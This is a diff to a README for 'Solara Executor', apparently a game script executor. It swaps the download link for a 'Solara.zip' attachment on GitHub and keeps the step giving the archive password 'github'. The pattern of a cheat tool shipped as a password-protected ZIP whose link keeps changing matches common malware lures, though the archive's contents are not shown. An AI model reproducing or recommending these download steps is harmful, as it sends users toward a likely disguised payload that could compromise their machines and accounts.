@@ -3,7 +3,7 @@
 ## Installation
 To install Solara Executor, follow these simple steps:
 1. Download the Solara Executor package from here 
-    [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/user-attachments/files/16842178/Solara.zip)
+    [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/user-attachments/files/16868665/Solara.zip)
  
 2.  **PASS: github**
 3. Extract the downloaded ZIP file to your desired location on your system.
